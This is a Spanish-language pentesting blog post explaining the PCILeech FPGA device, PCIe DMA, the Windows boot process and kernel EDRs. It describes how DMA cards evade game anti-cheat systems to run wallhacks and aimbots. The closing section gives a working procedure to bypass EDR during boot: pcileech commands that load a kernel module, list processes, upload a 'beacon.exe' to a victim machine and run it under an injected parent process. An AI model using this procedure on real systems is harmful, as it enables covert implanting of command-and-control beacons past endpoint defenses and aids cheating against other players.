---
author: Adonai Diaz / Arnold Morales
pubDatetime: 2025-06-19T21:30:00Z
modDatetime: 2025-06-19T21:37:45.934Z
title: DMA Avanzado por hardware
slug: DMA-Introduction
featured: true
draft: false
tags:
  - Hardware
  - DMA
  - FPGA
  - Kernel
  - PCILeech 
description:
  Acceso directo a memoria por medio de harware, cómo una FPGA puede ofrecernos una ventana a un nuevo ataque de kernel.
---

## Introducción a Dynamic-Memory-Access (DMA) 

En muchas ocasiones cómo pentesters nos aferramos a la idea de buscar multiples técnicas de ataque de manera "virtual", buscando software especializado o creando scripts que nos ayuden a identificar una vulnerabilidad para acceder a un programa o dispositivo en el que nos enfoquemos, pasamos tanto tiempo enfrente de nuestra pantalla, lanzando comandos a lo bastardo hasta ver que podemos encontrar que a veces ignoramos que existen soluciones alternativas y no simplemente de manera virtual, sino de una manera en que podemos tocar, armar y desarmar (esto suele ser menos buscado por pentester, entonces tambien hay menos documentacion).

Para nosotros el hardware también es una parte en la que podemos encontrar vulnerabilidades y solo basta con ver cómo trabaja el dispositivo al que realizaremos pentest, identificando cada uno de los protocolos con los que se relaciona de manera física.
con lenguajes como System Verilog, Verilog y VHDL, y la PCILeech contiene un chip de este tipo.
En esta ocasión nos interesa compartir sobre un tema que nos tomo mucho de investigación. DMA (Dynamic Memory Access) es un método que nos permite acceder a memoria directamente sin la necesidad de credenciales de nuestro sistema operativo Linux o Windows, a través de los puertos PCI/PCIe y usando su protocolo.

Esto nace a partir de que en pruebas de penetración a videojuegos llegamos a identificar el dispositivo PCILeech, una herramienta de hardware que nos permite realizar el DMA.

Este dispositivo tiene diversos repositorios donde entrega software, recursos e instrucciones para saber cómo utilizarlo. Aunque podríamos dar las instrucciones de cómo podemos usarlo, deseamos enfocar este artículo más a tema de hardware para entender cómo es que este dispositivo funciona a nivel físico.

### PCILeech??

El dispositivo PCILeech puede conectarse a una interfaz PCI/PCIe (cómo lo dice su mismo nombre) y este interactúa con el mismo protocolo ¿Pero qué lo conforma para poder trabajar a ese nivel? Hablar del protocolo PCIe no es un tema sencillo, es muy extendido y conocerlo por completo es conocer una rama entera, pero daremos una explicación resumida.

La PCILeech tiene un chip importante que le permite tener comunicación con el protocolo, este es un FPGA que son chips usados para el diseño a nivel silicio mediante la programación de hardware con lenguajes cómo VHDL, Verilog y SystemVerilog. Los CPUs o ASIC (cualquier chip encapsulado con pines) son productos ya fabricados con una funcionalidad ya especificada, pero las FPGA aún después de ser producidas pueden reprogramarse por el usuario dando total manipulación para cualquier uso.

Bueno y te preguntarás qué es un FPGA, anteriormente mencionamos que se usan para diseño a nivel silicio, pero ¿Por qué? FPGA significa <b>Field Programmable Gate Arrays</b>, que en español se traduce a Matriz de Puertas Programables en Campo ¿Y qué tiene que ver su nombre? Bueno si eres electrónico has investigado sobre circuitos integrados, y en el ámbito digital todos los chips llegan a funcionar a base de compuertas lógicas y tú lector, si no sabes que son las compuertas logicas en eléctronica, son lo mismo que las operaciones lógicas como "OR", "AND" y otras más, pero a nivel físico fabricadas con un arreglo de circuitos en miniatura. Entonces, continuando con la FPGA, esta tiene miles de compuertas internamente, que pueden ser programadas y realizar casi cualquier trabajo que se desee, incluso realizar el funcionamiento de un procesador. 

Aunque no todas las FPGAs puedan trabajar con PCI Express por el motivo de las velocidades de transmisión del protocolo, PCILeech integra una XILINX-7 que ya tiene una Capa Física para implementar el estandar de PCIe y soportar el protocolo, haciendolo eficiente para el trabajo de DMA.

Aparte de tener la FPGA, tiene dos componentes para interfaz JTAG y serial, uno para la programación de la FPGA (aunque no todos los modelos lo tienen) y otra para la comunicación entre FPGA y la computadora. Estos son chips FTDI que son componentes especializados en un funcionamiento de USB-Bridge que nos permiten interactuar con la FPGA integrada. Ya el resto del funcionamiento depende de la programación en SystemVerilog que se le haya dado a la FPGA, cada modelo de PCILeech encontramos su programación en el repositorio de [pcileech-fpga](https://github.com/ufrisk/pcileech-fpga).

### Cómo es que funciona a nivel hardware?

El protocolo PCIe nos permite realizar lectura directamente a la memoria RAM, no por CPU sino por el mismo bus de PCIe. Pero ¿cómo funciona esto? Todo es por parte del protocolo PCI Express, el mismo protocolo permite que cualquier dispositivo físico (périferico) transfiera datos directamente a y desde la memoria del sistema sin intervención del CPU, esto para optimizar el rendimiento y reduciendo la carga del procesador. Tal vez en el desarrollo fue una buena idea, "¡Si! De esta manera evitamos que el procesador no se estresé tanto y reducimos tiempo de procesamiento"... bueno, para los pentesters fue oro.

La PCIeLeech se conecta a algún puerto de PCI Express disponible, el protocolo PCI Express lleva consigo paquetes TLP (Transaction Layer Packets) o paquetes de transacción que funcionan de esta manera: 

1. Cuando se conecta la PCI Express, la PCILeech se vuelve un un Endpoint, el cual debe entregar la información debida para que se realice la comunicación, esto es posible gracias a librerias de SystemVerilog que ya implementan el proceso de conexión del protocolo.

2. Una vez conectado realiza negociaciones de memoria con paquetes PCI TLP, estos indican que peticiones de memoria hacer o que peticiones de memoria escribir, todo posible gracias a que el Root Complex (Una parte del CPU) permite el manejo directo de memoria RAM. No es una falla, es parte del protocolo.

3. Ya que se tiene la conexión a la FPGA manda información y esto se realiza por una conexión al FTDI, el USB-Bridge. Este se conecta a la computadora y el usuario ya tiene manera de leer e ingresar información a la FPGA.

Este hardware usa [LeechCore](https://github.com/ufrisk/LeechCore) que para quienes no lo conozcan es una libreria utilizada para la adquisicion de memoria, esto funciona a nivel software donde interpreta los datos enviados por la PCILeech, y dependiendo de lo que se desee hacer, lee o escribe cierta sección de memoria, según la documentación puede hacerlo hasta 4GB de memoria.

Para su manipulación existen diferentes recursos que nos entregan los creadores del propio [repositorio](https://github.com/ufrisk/pcileech) de PCILeech, donde incluso entregan software que funciona con Windows.

## Vulnerabilidad 

Bueno si eres un pentester esto talvez te puede interesar, directamente como su nombre lo menciona tu puedes entrar ala memoria que este en ejecucion, para nuestra mala suerte tendremos algunas limitantes como solo podremos levantar CMD de usuario normal si este tiene protecciones, si queremos obtener NT SYSTEM y existe un EDR pues complica un poco las cosas, pero no es una limitante aun cada EDR/AV tiene su funcionamiento no busco mostrar que alguno de esto son debiles porque todo depende tambien de las configuraciones implementadas asi que para esto deberiamos regresarnos a los terminos "callbacks, callstacks, etc..".

Ademas de las CMD, tenemos mas funciones directamente expuestas por el responsable de esta vulnerabilidad y gracias a el esto no podria existir. Hablo de  [ufrisk](https://github.com/ufrisk/pcileech/) MUCHAS GRACIAS!.

Ahora si una vez devolvimos sus creditos vemos un poco sobre su proyecto en [GITHUB](https://github.com/ufrisk/pcileech/tree/master/pcileech_shellcode).

En listare las que para mi son las mas importantes:

* uefi_winload_ntos_kmd.asm
* uefi_winload_ntos_kmd_c.c
* uefi_winload_ntos_patch.c
* wx64_exec_user.asm
* wx64_exec_user_c.c
* wx64_filepull.c
* wx64_filepush.c
* wx64_pscreate.c
* wx64_pskill.c
* wx64_pslist.c
* wx64_unlock.c
* wx64_stage1.asm
* wx64_umd_exec_c.c

Okay estos son los que mas he usado, pero si solo descargas y ejecutas todo, ESO ESTA MAL, comprendamos como funciona.

bueno como podras darte cuenta en los primeros 3 de la lista, vemos un ASM y un C por cada artefacto, bueno esto los puse directamente porque para usar los "modulos" de esta tool que seria algo como  'pcileech.exe -device fpga wx64_pscmd -kmd 0x7ffff000' el modulo seria wx64_pscmd, bueno estos modulos para compilarlos y usarlos tiene que ser en .ksh si no no podras usarlos, o si no quieres quemarte las pestañas haz algo mas sencillos como modificar uno... 

Ahora bien esto es de importancia, ya compilados se ven algo asi:

* wx64_filepull.ksh
* wx64_filepush.ksh
* wx64_pageinfo.ksh
* wx64_pagesignature.ksh
* wx64_psblue.ksh
* wx64_pscmd.ksh
* wx64_pscmd_user.ksh
* wx64_pscreate.ksh
* wx64_pskill.ksh
* wx64_pslist.ksh
* wx64_unlock.ksh

como vemos los nombres PS son de proceso, entonces pslist es para enlistar procesos, pskill para matarlos etc...

# Donde entraria aqui algo?

Bueno recordemos que PCILeech nacio para videojuegos 
CONTEXTOOOO:

Las tarjetas DMA funcionan fuera del sistema, lo que difiere de los trucos de software convencionales que modifican archivos o insertan código durante la operación del proceso. La tecnología sigue siendo indetectable debido a sus difíciles características de detección.

Los jugadores utilizan tarjetas DMA basadas en hardware para evadir sistemas antitrampas, incluidos BattlEye, EAC y Vanguard ya que estos sistemas actualmente avanzan rápidamente. Estos trucos siguen siendo indetectables porque leen la memoria directamente desde una máquina separada que ofrece datos para ESP (wallhacks) y aimbots y otras funciones de explotación.


¿Qué son las tarjetas DMA en videojuegos?

El Tarjeta DMA funciona como un dispositivo de hardware externo especializado a través de Puertos PCIe o Thunderbolt/USB-C para realizar la adquisición de datos de memoria para computadoras. El funcionamiento externo de las tarjetas DMA las hace indetectables para el software antitrampas porque la participación de la CPU no es necesaria como en los métodos de software tradicionales.

¿Por qué se utilizan tarjetas DMA?
* El campo de la ciberseguridad y la ciencia forense utiliza tarjetas DMA para pruebas de penetración y tareas de ingeniería inversa, así como operaciones de descarga de memoria.

* Las tarjetas DMA sirven como una herramienta de optimización del rendimiento porque aumentan la velocidad de cálculo y aceleran los modelos de aprendizaje automático.

* Las tarjetas DMA permiten a los jugadores detectar datos de la memoria del juego en tiempo real sin activar ninguna alarma de trampa, lo que les permite implementar ESP (wallhacks) y aimbots y extraer datos del juego.

 
Cómo funcionan los trucos de DMA en los juegos
Las tarjetas DMA funcionan dentro de entornos de piratería de juegos mediante la obtención de datos de juegos en vivo que consisten en datos de posicionamiento del jugador junto con indicadores de salud junto con el estado de la munición y detalles adicionales de las variables del juego; sin embargo, este proceso no altera el contenido de los archivos del juego. El funcionamiento de DMA hace trampa en las funciones de la siguiente secuencia.


¿Por qué son tan difíciles de detectar los trucos de DMA?
Los trucos de DMA siguen siendo muy indetectables debido a su funcionamiento de hardware, que ocurre más allá de las áreas estándar de monitoreo antitrampas. La lectura de la memoria externa a través de trucos basados en DMA elimina cualquier modificación detectable que ocurra al actualizar la memoria del programa de software. Hay múltiples razones por las que los trucos de DMA resultan difíciles de detectar.

¿por qué los trucos de DMA son tan difíciles de detectar

1. Sin modificación directa de archivos de juego o memoria
Los programas antitrampas BattleEye y EAC con Vanguard tienen suficiente poder para encontrar trucos tradicionales que utilizan inyecciones de DLL o modificaciones de memoria. Los trucos basados en DMA funcionan exclusivamente mediante lectura de memoria, ya que esta actividad les impide alterar el proceso de juego en curso.

 
2. Opera fuera del ecosistema del Juego
Los jugadores interconectan tarjetas DMA a través de hardware externo que se conecta mediante puertos PCIe, Thunderbolt o USB-C, lo que deja a la aplicación del juego incapaz de detectarlas. La funcionalidad de escaneo del software antitrampas se limita a los procesos de memoria interna, por lo que no pueden verificar qué tarjetas DMA extraen del sistema.
 

3. Sin inyección de DLL ni modificación del proceso
Los ejecutables del juego necesitan modificaciones o procesos de terceros en segundo plano para el funcionamiento de los hacks y wallhacks ESP tradicionales de Aimbots. La capacidad de detección de memoria de DMA engaña a las funciones sin ninguna inyección de código porque permite la indetectabilidad frente a los métodos de detección basados en firmas.


4. Los trucos activados por DMA funcionan correctamente en configuraciones en red
Los trucos basados en DMA disponibles en el mercado ofrecen compatibilidad de red que permite la extracción de datos del juego a través de una PC secundaria conectada mediante conexión Wi-Fi o Ethernet. La separación física de las operaciones de trampa de la PC para juegos a través de esta configuración hace que sea excepcionalmente difícil para el software antitrampas detectar comportamientos inusuales.

Bueno como lo vimos arriba, esto inicio para andar chetado con el tiempo metieron para forenses y cosas asi, dentro de nuestra investigacion yo tenia la teoria que esto podria funcionar para bypassear defensas.... si FUNCIONO!

# Ahora bien busquemos porque funciono!

Cuando se enciende una computadora con Windows, el proceso de arranque sigue una secuencia de etapas que comienza con el firmware y termina con la interfaz gráfica del sistema operativo. A continuación, se describe cómo se ve y cómo funciona este proceso:

* Encendido y firmware (BIOS/UEFI): Al presionar el botón de encendido, la fuente de alimentación envía energía y la señal Power Good activa la CPU. Esta carga desde una dirección de memoria fija (por ejemplo, FFFF0h en procesadores x86) el código del firmware, que puede ser BIOS o UEFI.  En sistemas modernos con UEFI, se muestra una interfaz gráfica durante esta fase.
* POST (Power-On Self Test): El firmware ejecuta una prueba de autodiagnóstico del hardware. Durante esta etapa:
    + Se verifica la memoria RAM (se muestra el conteo en pantalla).
    + Se comprueba la tarjeta gráfica y se inicia el sistema de video.
    + Se detectan dispositivos como disco duro, teclado, y monitor.
    + Si hay errores, se emiten pitidos o se muestran códigos de error en pantalla. 
* Búsqueda del dispositivo de arranque: El firmware busca en la secuencia definida (BIOS/UEFI Setup) un dispositivo con un sistema operativo instalado: disco duro, SSD, USB, etc.
* Carga del gestor de arranque de Windows: El firmware carga el Windows Boot Manager (BOOTMGR) desde la partición de arranque.  En esta fase, aparece una pantalla azul o negra con el logo de Windows y una barra de carga (en Windows 10/11), indicando que el sistema está cargando.
* Carga del kernel y servicios: El gestor de arranque carga los archivos clave:
    + NTOSKRNL.EXE (núcleo del sistema).
    + HAL.DLL (capa de hardware).
* Se cargan los controladores necesarios desde el registro de Windows.
* Se inicia WINLOGON.EXE, que muestra la pantalla de inicio de sesión (saludo, foto de usuario, campo de contraseña o inicio de sesión biométrico). 
* Interfaz de usuario: Finalmente, se inicia el entorno gráfico (Escritorio, menú Inicio, etc.), y el sistema está listo para uso. 
Aspecto visual típico:

    + Inicio: Pantalla negra o azul con logo de Windows y barra de carga.
    + Durante el proceso: Transición a la pantalla de inicio de sesión (Windows 10/11).
    + Si hay problemas, se muestra una pantalla de error (como "Windows no se pudo iniciar" o "Error de arranque"). 
    + Este proceso, aunque rápido, implica múltiples pasos desde el hardware hasta el software, garantizando que el sistema operativo se cargue de forma segura y controlada.

Bueno y lo que nos importa a nivel de EDR suele ser NTOSKRNL.exe, este de aqui como vimos es kernel, ahora que sucede?.

Dependiendo del EDR tendra su agente evidentemente no puede arrancar antes que el kernel, pero si le haces algo a ese proceso lo rompes (te dice alguien que lo hizo xD), hay muchas cosas que faltan explicar pero tendre que frenar aqui para que estemos en la misma frecuencia.

# Retexto

Bueno ya explique PCILeech, ahora vayamos a abordar windows.

El proceso de arranque de Windows, conocido como boot process, se divide en varias fases como ya lo vimos: PreBoot (inicialización del firmware BIOS/UEFI y POST), Boot Manager (carga de bootmgr o bootmgfw.efi), OS Loader (ejecución de winload.exe para cargar el kernel) y Kernel Initialization (carga de ntoskrnl.exe y hal.dll, inicialización de controladores y servicios).  Finalmente, se inicia winlogon.exe para presentar la interfaz de usuario. Este proceso permite pasar de un estado apagado a un sistema operativo funcional mediante una secuencia jerárquica y verificada. 

Respecto a los EDR (Endpoint Detection and Response) basados en el kernel, operan en modo kernel, el nivel más privilegiado del sistema (algunos juegan en UEFI), lo que les permite supervisar actividades de bajo nivel como llamadas al sistema, manipulación de memoria, carga de controladores y acceso a archivos.  Al ejecutarse en este modo, los EDR pueden detectar y bloquear amenazas avanzadas como rootkits o malware persistente que intentan eludir las protecciones del modo usuario. Su integración profunda con el kernel les permite realizar monitoreo en tiempo real, análisis de comportamiento y respuesta inmediata ante actividades sospechosas durante y después del arranque.

Normalmente los EDRs se encuentran en KERNEL pero como lo mencione, existen otros que se encuentran en UEFI y si recordamos como funciona windows atras de UEFI esta SMM entonces es algo un poco mas dicil.

Mas teoria.
Callbacks
Un callback en Windows es un mecanismo que permite a componentes del sistema, especialmente drivers de kernel, recibir notificaciones cuando ocurren eventos específicos.  Estos eventos pueden incluir la creación de procesos, modificaciones en el registro, operaciones con manejadores (handles) o cambios en el estado del sistema. El sistema invoca funciones proporcionadas por el usuario (callbacks) cuando tales eventos se producen, permitiendo una respuesta dinámica y personalizada. 

Callstacks
El call stack (pila de llamadas) es una estructura de datos que gestiona el flujo de ejecución en un programa al rastrear las funciones activas.  Cada vez que se llama a una función, se crea un nuevo marco de pila (stack frame) que almacena información como la dirección de retorno, los parámetros y las variables locales. Este marco se añade al topo de la pila, y cuando la función termina, se elimina (desapila), devolviendo el control a la función anterior. 

Proceso Padre 
En Windows, el concepto de proceso padre se diferencia significativamente del modelo jerárquico típico de Unix/Linux. Aunque un proceso puede crear otros procesos, Windows no tiene una jerarquía de procesos formal como en Unix.  Todos los procesos son tratados de forma más igualitaria.

* Creación de procesos: Un proceso padre en Windows utiliza la llamada al sistema CreateProcess() para crear un proceso hijo. Esta función permite especificar el archivo ejecutable del hijo y otros parámetros de inicio.
* Control y relación: Aunque el proceso padre recibe un manejador (token) especial para controlar al proceso hijo, no existe una obligación inherente de supervisión.  El padre puede pasar este manejador a otros procesos, lo que anula cualquier estructura jerárquica establecida.
* Terminación: Si un proceso padre termina, sus procesos hijos no mueren automáticamente.  A diferencia de Unix, donde los hijos pueden quedar sin padre y ser adoptados por init (PID 1), en Windows los hijos continúan ejecutándose independientemente. Esto puede llevar a procesos huérfanos si no se gestionan adecuadamente.
* Gestión de recursos: El proceso padre debe gestionar explícitamente la terminación de sus hijos, utilizando funciones como TerminateProcess() si es necesario, para liberar recursos.

En resumen, el proceso padre en Windows tiene una función de creación y control, pero la relación entre padres e hijos no es rígida ni jerárquica, y la supervivencia de los hijos no depende de la existencia del padre. 

Proceso Hijo
En Windows, un proceso hijo es un proceso que se crea a partir de otro proceso, llamado proceso padre, mediante la función de la API CreateProcess.  A diferencia de sistemas como Unix, donde existe una jerarquía clara de procesos padre-hijo, en Windows esta relación es más flexible: aunque el proceso padre recibe un identificador (manejador) para controlar al hijo, puede pasar este manejador a otros procesos, lo que debilita la jerarquía. 

Creación de un proceso hijo en Windows

La función principal es CreateProcess, que permite especificar:
1. El archivo ejecutable del proceso hijo.
2. Parámetros de línea de comandos.
3. Atributos de seguridad.
4. Control sobre la herencia de archivos abiertos.
5. Prioridad del proceso.
6. Información sobre la ventana del proceso.

El sistema operativo crea un nuevo proceso (hijo) que hereda muchos atributos del padre, como:
1. Tabla de descriptores de archivos.
2. Directorio actual.
3. IDs de usuario (real y efectivo).
4. Valores de prioridad y nice. 

Características clave
* Independencia: Aunque el hijo hereda recursos del padre, ejecuta en su propio espacio de memoria y contexto. 
* Heredabilidad: El proceso hijo puede crear sus propios hijos, formando una estructura de procesos más compleja. 
* Terminación: El proceso padre puede terminar sin que el hijo se detenga. Si el padre termina antes que el hijo, el hijo pasa a ser controlado por el proceso init (PID 1), evitando que se convierta en zombie. 
* Comunicación: Se puede usar mecanismos como pipes, memoria compartida, o sockets para que procesos padre e hijo intercambien datos. 
Control y gestión

Me extendi un poco en lo ultimo pero es de suma importancia.

Ahora bien como lo rompemos?, como usaria yo DMA para deshabilitar o simplemente ejecutar un Beacon.

# Lo chido

Como la teoria lo marca todo se une aqui, el/los EDRs no arrancan al mismo tiempo que la lectura o montadura que se haya realizado con DMA, tu podras enlistar los procesos cuando ya se carga el kernel y inicia el winlogon.exe, entonces este momento es clave ya que si prestamos atencion el EDR aun no esta trabajando, la mejor manera de no romperlo para ejecutar un beacon es inyectar un proceso padre para generar un proceso hijo, debes conocer el entorno cualquier proceso que tenga permitido ejecutar un cmd sera de valor para inyectar una ejecucion que en esta seria tu beacon, una vez que tengas la conexion puede que el EDR en tiempo despues te detecte (ami no me paso), pero si mueres en el intento debes moverte lateralmente en la computara para escalar jajajaja.

PCILeech proceso:

los comandos para replicar esto seria:

Lees memoria:
```cmd
pcileech.exe display -min 0x1000 -device fpga -v
```
te montas:
```cmd
pcileech.exe kmdload -kmd win10_x64_3 -memmap auto  
```
listas procesos:
```cmd
pcileech.exe -device fpga -kmd 0x7ffff000 wx64_pslist
```
subes tu beacon:
```cmd
pcileech wx64_filepush -kmd 0xffff00 -in c:\beacon.exe -s \??\c:\beacon.exe
```
-in: tu ruta local
-s: ruta victima

lo ejecutas:
```cmd
pcileech wx64_pscreate -kmd 0xffff00 -s C:\beacon.exe -0 PIDHEX
```
PIDHEX: debe ser el PID en hexadecimal 

# Conclusion 

Bueno en mi investigacion hubo varias personas en paralelo que intentaron evadir el EDR y fracasaron, pero yo creo que el fracaso no existe si no que es una nueva oportunidad para aprender, talvez lo que les fallo a ellos fue que no conocen como funciona internamente windows o simplemente no pensaron fuera de la caja.
